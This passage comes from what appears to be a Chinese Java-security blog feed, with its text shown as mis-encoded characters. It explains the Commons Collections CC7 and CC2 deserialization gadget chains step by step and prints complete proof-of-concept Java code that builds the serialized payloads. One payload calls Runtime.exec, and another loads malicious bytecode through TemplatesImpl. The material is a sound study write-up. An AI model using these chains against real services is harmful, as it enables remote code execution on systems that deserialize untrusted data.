class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. å…ˆæ£€æŸ¥ï¼šå¦‚æœä¸åŒ…å«è¿™ä¸ª key</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2.ã€è§¦å‘å‘½ä»¤æ‰§è¡Œã€‘è°ƒç”¨ factory (å³ Transformer) åˆ›å»ºå€¼</span></span><br><span class="line">        <span class="comment">// å¦‚æœæ˜¯æ”»å‡»é“¾ï¼Œè¿™é‡Œå°±ä¼šæ‰§è¡Œ exec(&quot;calc&quot;)</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3.ã€å…³é”®æ±¡æŸ“ç‚¹ï¼æŠŠæ–°å€¼å¡è¿›è‚šå­é‡Œã€‘</span></span><br><span class="line">        <span class="comment">// è¿™ä¸€æ­¥å°±æ˜¯ä¸ºä»€ä¹ˆä½ éœ€è¦ remove(&quot;yy&quot;) çš„åŸå› </span></span><br><span class="line">        map.put(key, value); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. è¿”å›æ–°åˆ›å»ºçš„å€¼</span></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¦‚æœ key å­˜åœ¨ï¼Œå°±æ­£å¸¸è·å–</span></span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>map.put(key, value)</code> ä¼šæ”¹å˜ Map çš„ç»“æ„ã€‚åœ¨æœ¬åœ°æ„é€  Payload çš„è¿‡ç¨‹ä¸­ï¼Œè¿™ä¸ªå‰¯ä½œç”¨ä¼šå¯¼è‡´ Payload è¢«â€œæ±¡æŸ“â€ï¼ˆå¤šå‡ºäº†ä¸è¯¥æœ‰çš„ Keyï¼‰ã€‚å¦‚æœä¸æ‰‹åŠ¨ <code>remove</code> æ‰ï¼Œå‘ç»™å—å®³è€…æ—¶ï¼Œå—å®³è€…ä¸€æŸ¥å‘ç°â€œå’¦ï¼Œä½ æœ‰ â€˜yyâ€™ å•Šâ€ï¼Œå°±ä¸ä¼šèµ°è¿›è¿™ä¸ª <code>if</code> è¯­å¥ï¼Œä¹Ÿå°±æ°¸è¿œèµ°ä¸åˆ° <code>factory.transform</code> è¿™ä¸€è¡Œäº†ã€‚</p><p><strong>çŠ¶æ€å›¾</strong></p><table><thead><tr><th><strong>æ­¥éª¤</strong></th><th><strong>LazyMap2 çš„çŠ¶æ€</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>1. åˆå§‹åŒ–</td><td><code>{&quot;zZ&quot;: 1}</code></td><td>åˆå§‹çº¯å‡€çŠ¶æ€</td></tr><tr><td>2. <code>hashtable.put()</code></td><td><code>{&quot;zZ&quot;: 1, &quot;yy&quot;: obj}</code></td><td><strong>è¢«æ±¡æŸ“ï¼</strong> æœ¬åœ°è§¦å‘äº†ä¸€æ¬¡ getï¼Œè‡ªåŠ¨ç”Ÿæˆäº† yy</td></tr><tr><td>3. <strong>å¦‚æœç›´æ¥åºåˆ—åŒ–</strong></td><td><code>{&quot;zZ&quot;: 1, &quot;yy&quot;: obj}</code></td><td>å‘é€ç»™å¯¹æ–¹çš„æ˜¯è„æ•°æ®</td></tr><tr><td>4. å¯¹æ–¹ååºåˆ—åŒ–æ‰§è¡Œ <code>get(&quot;yy&quot;)</code></td><td><strong>ç›´æ¥è¿”å› obj</strong></td><td>å› ä¸ºæœ‰äº† yyï¼Œå°±ä¸è§¦å‘æ¼æ´é€»è¾‘äº†</td></tr><tr><td></td><td></td><td></td></tr><tr><td><strong>æ­£ç¡®çš„åšæ³•</strong></td><td></td><td></td></tr><tr><td>3. <code>lazyMap2.remove(&quot;yy&quot;)</code></td><td><code>{&quot;zZ&quot;: 1}</code></td><td><strong>æ¢å¤çº¯å‡€</strong>ï¼Œé‡ç½®é™·é˜±</td></tr><tr><td>4. åºåˆ—åŒ–å‘é€</td><td><code>{&quot;zZ&quot;: 1}</code></td><td>å‘é€å¹²å‡€æ•°æ®</td></tr><tr><td>5. å¯¹æ–¹ååºåˆ—åŒ–æ‰§è¡Œ <code>get(&quot;yy&quot;)</code></td><td><strong>è§¦å‘ Transformer</strong></td><td>å› ä¸ºæ²¡æœ‰ yyï¼ŒLazyMap æ‰ä¼šå»æ‰§è¡Œå‘½ä»¤</td></tr></tbody></table><h4 id="Dã€è°ƒç”¨çš„getæ–¹æ³•"><a href="#Dã€è°ƒç”¨çš„getæ–¹æ³•" class="headerlink" title="Dã€è°ƒç”¨çš„getæ–¹æ³•"></a>Dã€è°ƒç”¨çš„<code>get</code>æ–¹æ³•</h4><p><strong>lazyMap2</strong></p><p><strong>ç¬¬ä¸€å¹•ï¼šè¿˜åŸ Hashtableï¼ˆå¼€ç®±ï¼‰</strong></p><p>å—å®³è€…æœåŠ¡å™¨å¼€å§‹è¯»å– <code>ser.bin</code>ã€‚</p><ol><li><strong>è¯»å–ç¬¬ä¸€ä¸ªå¯¹è±¡</strong>ï¼šå®ƒè¯»åˆ°äº† <code>lazyMap1</code>ï¼ˆé‚£ä¸ªæŒæœ‰ <code>&quot;yy&quot;</code> é’¥åŒ™çš„è­¦å¯Ÿï¼‰ã€‚<ul><li>æœåŠ¡å™¨æŠŠå®ƒæ”¾è¿›æ–°å»ºçš„ <code>Hashtable</code> çš„ 5 å·æŸœå­ï¼ˆå‡è®¾ Hash æ˜¯ 5ï¼‰ã€‚</li><li>æ­¤æ—¶æŸœå­æ˜¯ç©ºçš„ï¼Œç›´æ¥æ”¾å…¥ã€‚<strong>å¹³å®‰æ— äº‹</strong>ã€‚</li></ul></li><li><strong>è¯»å–ç¬¬äºŒä¸ªå¯¹è±¡</strong>ï¼šå®ƒè¯»åˆ°äº† <code>lazyMap2</code>ï¼ˆé‚£ä¸ªè¢«æ¸…ç©ºäº† <code>&quot;yy&quot;</code> ä¸”èº«æ€€ç‚¸å¼¹çš„å«Œç–‘äººï¼‰ã€‚<ul><li>æœåŠ¡å™¨è®¡ç®—å®ƒçš„ Hashï¼Œå‘ç°ä¹Ÿæ˜¯ 5ã€‚</li><li>æœåŠ¡å™¨å‡†å¤‡æŠŠå®ƒä¹Ÿæ”¾è¿› 5 å·æŸœå­ã€‚</li></ul></li></ol><p><strong>ç¬¬äºŒå¹•ï¼šç¢°æ’ä¸ç›˜æŸ¥ï¼ˆè§¦å‘ç‚¹ï¼‰</strong></p><p>å› ä¸º 5 å·æŸœå­é‡Œå·²ç»æœ‰äººäº†ï¼ˆ<code>lazyMap1</code>ï¼‰ï¼Œ<code>Hashtable</code> å†…éƒ¨çš„ä»£ç ï¼ˆ<code>reconstitutionPut</code>ï¼‰ç«‹åˆ»è­¦è§‰èµ·æ¥ï¼š</p><ul><li><strong>Hashtable</strong>ï¼šâ€œåŒä¸€ä¸ªæŸœå­ä¸èƒ½æ”¾é‡å¤çš„ Keyï¼Œæˆ‘å¾—æ£€æŸ¥ä¸€ä¸‹è¿™ä¿©æ˜¯ä¸æ˜¯åŒä¸€ä¸ªä¸œè¥¿ã€‚â€</li><li><strong>åŠ¨ä½œ</strong>ï¼šè°ƒç”¨ <code>e.key.equals(key)</code>ã€‚<ul><li><code>e.key</code> æ˜¯æŸœå­é‡Œåç€çš„ <code>lazyMap1</code>ã€‚</li><li><code>key</code> æ˜¯æ–°æ¥çš„ <code>lazyMap2</code>ã€‚</li></ul></li><li><strong>æ‰§è¡Œä»£ç </strong>ï¼š<code>lazyMap1.equals(lazyMap2)</code>ã€‚</li></ul><p><strong>ç¬¬ä¸‰å¹•ï¼šå€Ÿåˆ€æ€äººï¼ˆAbstractMap é€»è¾‘ï¼‰</strong></p><p>ä»£ç è¿›å…¥ <code>AbstractMap.equals()</code>ã€‚è¿™æ˜¯ <code>lazyMap1</code> çš„ä¸»åœºã€‚</p><ol><li><strong>lazyMap1</strong>ï¼šâ€œæ—¢ç„¶è¦æ¯”ï¼Œé‚£å°±æ‹¿æˆ‘çš„æ¸…å•æ¥æ¯”ã€‚â€</li><li><strong>éå†</strong>ï¼š<code>lazyMap1</code> æ‹¿å‡ºäº†å®ƒå”¯ä¸€çš„ä¸€ä¸ª Key â€”â€” <strong><code>&quot;yy&quot;</code></strong>ã€‚<ul><li><em>æ³¨ï¼šè¿™ä¸ª Key æ˜¯æˆ‘ä»¬åœ¨ Payload æ„é€ é˜¶æ®µä¿ç•™ä¸‹æ¥çš„ï¼Œæ²¡æœ‰è¢« removeã€‚</em></li></ul></li><li><strong>è´¨é—®</strong>ï¼š<code>lazyMap1</code> æŒ‡ç€ <code>lazyMap2</code> é—®ï¼šâ€œä½ æœ‰æ²¡æœ‰ <strong><code>&quot;yy&quot;</code></strong> å¯¹åº”çš„å€¼ï¼Ÿæ‹¿å‡ºæ¥ï¼â€</li><li><strong>æ‰§è¡Œä»£ç </strong>ï¼š<strong><code>lazyMap2.get(&quot;yy&quot;)</code></strong>ã€‚</li></ol><p><strong>ç¬¬å››å¹•ï¼šå¼•çˆ†ï¼ˆLazyMap é€»è¾‘ï¼‰</strong></p><p>è¿™æ˜¯æœ€å…³é”®çš„ä¸€åˆ»ã€‚ä»£ç è·³è½¬åˆ°äº† <code>lazyMap2</code> çš„ <code>get</code> æ–¹æ³•ä¸­ã€‚</p><ol><li><strong>æ£€æŸ¥åº“å­˜</strong>ï¼š<code>lazyMap2</code> ç¿»äº†ä¸€ä¸‹è‡ªå·±çš„å£è¢‹ã€‚<ul><li><em>å›æƒ³ä¸€ä¸‹</em>ï¼šæˆ‘ä»¬åœ¨å‘é€å‰ä¸“é—¨æ‰§è¡Œäº† <code>lazyMap2.remove(&quot;yy&quot;)</code>ã€‚</li><li><strong>ç»“æœ</strong>ï¼š<strong>æ‰¾ä¸åˆ° <code>&quot;yy&quot;</code>ï¼</strong></li></ul></li><li><strong>è§¦å‘åé—¨</strong>ï¼š<ul><li><code>LazyMap</code> çš„é€»è¾‘æ˜¯ï¼šâ€œæ²¡æœ‰ï¼Ÿé‚£æˆ‘å°±é€ ä¸€ä¸ªã€‚â€</li><li>å®ƒè°ƒç”¨ <code>factory.transform(&quot;yy&quot;)</code>ã€‚</li></ul></li><li><strong>æ ¸çˆ†</strong>ï¼š<ul><li>è¿™é‡Œçš„ <code>factory</code> æ˜¯ä»€ä¹ˆï¼Ÿ</li><li><strong>å›æƒ³ä¸€ä¸‹</strong>ï¼šæˆ‘ä»¬åœ¨å‘é€å‰é€šè¿‡åå°„ï¼ŒæŠŠ <code>lazyMap2</code> çš„ <code>factory</code> æ›¿æ¢æˆäº†æ¶æ„çš„ <code>finalChainedTransformer</code>ã€‚</li><li><strong>ç»“æœ</strong>ï¼š<strong><code>Runtime.exec(&quot;calc&quot;)</code> è¢«æ‰§è¡Œã€‚</strong></li></ul></li></ol><h4 id="Eã€æ„å¤–ç‚¹"><a href="#Eã€æ„å¤–ç‚¹" class="headerlink" title="Eã€æ„å¤–ç‚¹"></a>Eã€æ„å¤–ç‚¹</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span>  <span class="operator">=</span> LazyMap.lazyMap(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(map2,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">2</span>));</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ</p><p><code>obj2.put(lazyMap1, 1)</code>ï¼šæˆåŠŸæ”¾å…¥ã€‚</p><p><code>obj2.put(lazyMap2, 1)</code>ï¼šå‘ç”Ÿ Hash ç¢°æ’ï¼Œè§¦å‘ <code>lazyMap1.equals(lazyMap2)</code>ã€‚</p><p><strong>æ¯”è¾ƒè¿‡ç¨‹</strong>ï¼š</p><ul><li><code>lazyMap1</code> æ‹¿å‡º <code>&quot;yy&quot;</code> (å€¼ä¸º 1)ã€‚</li><li>å»é—® <code>lazyMap2</code>ï¼š<code>lazyMap2.get(&quot;yy&quot;)</code>ã€‚</li><li><code>lazyMap2</code> æ²¡è´§ï¼Œè°ƒç”¨ Transformerï¼Œè¿”å› <strong>1</strong>ã€‚</li><li><code>AbstractMap</code> æ¯”è¾ƒï¼š<code>lazyMap1</code> çš„ 1 <strong>ç­‰äº</strong> <code>lazyMap2</code> è¿”å›çš„ 1ã€‚</li><li><strong>ç»“è®º</strong>ï¼š<code>equals</code> è¿”å› <strong><code>true</code></strong>ã€‚</li></ul><p><strong>Hashtable çš„å†³å®š</strong>ï¼š</p><ul><li>â€œè¿™ä¿©æ˜¯ä¸€æ ·çš„å˜›ï¼â€</li><li><strong>ç»“æœ</strong>ï¼šHashtable å¹¶æ²¡æœ‰å­˜å…¥ä¸¤ä¸ª Mapï¼Œè€Œæ˜¯<strong>åˆå¹¶</strong>æˆäº†ä¸€ä¸ªã€‚</li></ul><h3 id="3-æœ€ç»ˆpoc"><a href="#3-æœ€ç»ˆpoc" class="headerlink" title="3.æœ€ç»ˆpoc"></a>3.æœ€ç»ˆpoc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span>  <span class="operator">=</span> LazyMap.lazyMap(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(map2,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">2</span>));</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">obj2.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">obj2.put(lazyMap2,<span class="number">1</span>);</span><br><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">setFieldValue(lazyMap2,<span class="string">&quot;factory&quot;</span>,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(chuan));</span><br><span class="line"></span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>æˆåŠŸ</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272237262.png" alt="image-20260127223721047"></p><p><strong>åˆ°è¿™é‡Œ CC é“¾ä¹Ÿå°±ç»“æŸå•¦ï¼Œä¸‹å›¾æ˜¯æ€»ç»“</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601282346732.png" alt="Commons Collections_chuan"></p>]]></content>
      
      
      <categories>
          
          <category> CCé“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-CC2</title>
      <link href="/2026/01/28/CC2-Gadget/"/>
      <url>/2026/01/28/CC2-Gadget/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-CC2"><a href="#javaå®‰å…¨-CC2" class="headerlink" title="javaå®‰å…¨-CC2"></a>javaå®‰å…¨-CC2</h1><ul><li><strong>ç¯å¢ƒéƒ¨åˆ†æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œè¿™ä¸ªé“¾ä¸»è¦æ˜¯ç®€å•ä¿®æ”¹äº† CC4 çš„ transform æ–¹æ³•ç±»é€»è¾‘</strong></li></ul><h2 id="ä¸€ã€ä¸»è¦é€»è¾‘"><a href="#ä¸€ã€ä¸»è¦é€»è¾‘" class="headerlink" title="ä¸€ã€ä¸»è¦é€»è¾‘"></a>ä¸€ã€ä¸»è¦é€»è¾‘</h2><h3 id="1-invokeTransformer"><a href="#1-invokeTransformer" class="headerlink" title="1.invokeTransformer"></a>1.<code>invokeTransformer</code></h3><p><code>CC4</code> çš„å…¥å£ç±» <code>PriorityQueue</code> è¢«ä¿ç•™ä¸‹æ¥</p><p>å…¥å£é€»è¾‘å¯¹æ¯”<code>CC4</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">PriorityQueue#</span><span class="language-bash">readObject</span></span><br><span class="line"><span class="meta prompt_">PriorityQueue#</span><span class="language-bash">heapify</span></span><br><span class="line"><span class="meta prompt_">PriorityQueue#</span><span class="language-bash">siftDown</span></span><br><span class="line"><span class="meta prompt_">PriorityQueue#</span><span class="language-bash">siftDownUsingComparator</span></span><br><span class="line">TransformingComparator#compare</span><br><span class="line"></span><br><span class="line">CC3éƒ¨åˆ†</span><br><span class="line"><span class="meta prompt_">ChainedTransformer#</span><span class="language-bash">transform</span></span><br><span class="line"><span class="meta prompt_">InstantiateTransformer#</span><span class="language-bash">transform</span></span><br><span class="line"><span class="meta prompt_">TrAXFilter#</span><span class="language-bash">getConstructor</span></span><br><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">newTransformer</span></span><br><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">getTransletInstance</span></span><br><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">defineTransletClasses</span></span><br><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">defineClass</span></span><br><span class="line">åŠ è½½æ¶æ„å­—èŠ‚ç </span><br></pre></td></tr></table></figure><p><code>CC2</code>åªæ˜¯å¯¹å…¶ä¸­çš„<code>CC3</code>éƒ¨åˆ†åšå‡ºäº†æ”¹å˜ï¼Œç›´æ¥è·³è¿‡ä¸­é—´æ­¥éª¤ï¼Œä½¿ç”¨<code>invokeTransformer</code>è°ƒç”¨<code>TemplatesImpl#newTransformer</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">invokeTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure><p>è¿›è€Œè°ƒç”¨<code>TransformingComparator#compare</code>æ—¶ï¼Œç›´æ¥è°ƒç”¨çš„<code>InvokerTransformer#transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">invokeTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line"><span class="comment">//æ·»åŠ ä¸¤ä¸ªå…ƒç´ </span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">setFieldValue(comparator, <span class="string">&quot;transformer&quot;</span>, invokeTransformer);</span><br></pre></td></tr></table></figure><p><strong>è€æ ·å­ï¼Œä¸ºäº†é˜²æ­¢ç”Ÿæˆæ¶æ„ä»£ç æ—¶ add æ–¹æ³•èµ·ç«ï¼Œæˆ‘ä»¬é€šè¿‡åå°„æœ€åä¿®æ”¹ transformer</strong></p><h3 id="2-queue-add-1"><a href="#2-queue-add-1" class="headerlink" title="2.queue.add(1)"></a>2.<code>queue.add(1)</code></h3><p>è¿™ä¸ªæ–¹æ³•å¤§æœ‰ç”¨å¤„ï¼Œåœ¨è°ƒç”¨<code>TransformingComparator#compare</code>æ—¶ï¼Œç›´æ¥è°ƒç”¨çš„<code>InvokerTransformer#transform</code>æ–¹æ³•æ—¶ï¼Œè¿™é‡Œ<code>transform</code>æ–¹æ³•çš„å‚æ•°å°±æ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„1</p><p><strong>åœ¨ä¹‹å‰çš„é“¾è·¯é€»è¾‘ä¸­ï¼Œä½¿ç”¨äº† ConstantTransformer è¿™ä¸ªæ¥æ§åˆ¶è¿™ä¸ªå‚æ•°ï¼Œä½†æ˜¯è¿™æ¡é“¾ä¸ºäº†é¿å…æ•°ç»„çš„ä½¿ç”¨ï¼Œæ‰€ä»¥æ²¡æœ‰ä½¿ç”¨ ChainedTransformer åŒ…è£…æ¶æ„ç±»ï¼Œè€Œæ˜¯ç›´æ¥ä¼  InvokerTransformer ç±»ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬è¿™é‡Œä¼ å‚éœ€è¦ä¸ºï¼Œæ¶æ„ç±» TemplatesImpl</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">invokeTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line"><span class="comment">//æ·»åŠ ä¸¤ä¸ªå…ƒç´ </span></span><br><span class="line">queue.add(obj);</span><br><span class="line">queue.add(obj);</span><br><span class="line">setFieldValue(comparator, <span class="string">&quot;transformer&quot;</span>, invokeTransformer);</span><br></pre></td></tr></table></figure><p><strong>æˆåŠŸæ‰“é€š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601262053591.png" alt="image-20260126205309037"></p><h2 id="äºŒã€é“¾è·¯poc"><a href="#äºŒã€é“¾è·¯poc" class="headerlink" title="äºŒã€é“¾è·¯poc"></a>äºŒã€é“¾è·¯poc</h2><h3 id="1-poc"><a href="#1-poc" class="headerlink" title="1.poc"></a>1.poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\å°å·\\code\\javasec\\CC1\\target\\classes\\CC1\\HelloTranslet.class&quot;</span>));</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//åå°„ä¿®æ”¹å†…éƒ¨å±æ€§</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">invokeTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line"></span><br><span class="line">queue.add(obj);</span><br><span class="line">queue.add(obj);</span><br><span class="line">setFieldValue(comparator, <span 